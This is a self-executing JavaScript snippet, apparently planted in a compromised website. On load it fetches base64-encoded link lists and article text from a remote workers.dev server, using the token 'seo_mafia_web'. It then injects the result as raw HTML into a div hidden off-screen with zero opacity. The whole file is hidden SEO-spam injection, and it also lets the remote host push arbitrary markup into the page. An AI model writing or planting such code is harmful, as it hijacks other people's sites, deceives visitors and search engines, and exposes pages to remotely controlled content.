!function(){
try{
  if(document.getElementById("bunker-payload-2")) return;
  const API_BASE = "https://smw-queryjs.data-deliver.workers.dev";
  const TOKEN = "seo_mafia_web";
  const decode = (s) => {
    try {
      return new TextDecoder().decode(
        Uint8Array.from(atob(s), c => c.charCodeAt(0))
      );
    } catch(e) {
      console.error("Decode error:", e);
      return "";
    }
  };
  function decodeHTML(str){
    const txt = document.createElement("textarea");
    txt.innerHTML = str;
    return txt.value;
  }
  async function getData(id){
    try{
      const res = await fetch(`${API_BASE}/data-value?id=${id}&token=${TOKEN}`, { cache: "no-store" });
      const json = await res.json();
      return decode(json.payload || "");
    }catch(e){
      console.error("Fetch error:", e);
      return "";
    }
  }
  Promise.all([
    getData("b1"),
    getData("a1")
  ]).then(([anchorsRaw, articleRaw]) => {

    console.log("ANCHORS:", anchorsRaw);
    console.log("ARTICLE:", articleRaw);

    if(!anchorsRaw || !articleRaw){
      console.warn("❌ Data kosong");
      return;
    }
    const anchors = anchorsRaw
      .replace(/"/g,"")
      .split("\n")
      .map(x => x.trim())
      .filter(Boolean)
      .map(line => {
        const parts = line.split("|").map(x=>x.trim()).filter(Boolean);
        if(parts.length < 2) return "";

        const text = parts[0];

        return parts.slice(1).map(url=>{
          return `<a href="${url}" target="_blank">${text}</a>`;
        }).join(" ");
      })
      .filter(Boolean);
    console.log("ANCHOR RESULT:", anchors);
    if(!anchors.length){
      console.warn("❌ Anchor kosong");
      return;
    }
    let i = 0;
    let html;
    if(/\{ANCHOR/i.test(articleRaw)){
      html = articleRaw.replace(/\{ANCHOR\s*\}/gi, () => anchors[i++ % anchors.length]);
    }else{
      console.warn("⚠️ Tidak ada {ANCHOR}, fallback aktif");
      html = anchors.join(" ");
    }
    html = decodeHTML(html);
    if(html.includes("&lt;")){
      html = decodeHTML(html);
    }

    console.log("FINAL HTML:", html);
    function inject(){
      if(document.getElementById("bunker-payload-2")) return;
      const box = document.createElement("div");
      box.id = "bunker-payload-2";
      box.style.cssText = "position:absolute;left:-9999px;opacity:0;font-size:0;";
      box.innerHTML = html;
      document.body.appendChild(box);
      console.log("✅ Inject sukses panel 2");
    }
    if(document.body){
      inject();
    }else{
      document.addEventListener("DOMContentLoaded", inject);
    }
  });
}catch(e){
  console.error("Fatal error:", e);
}
}();
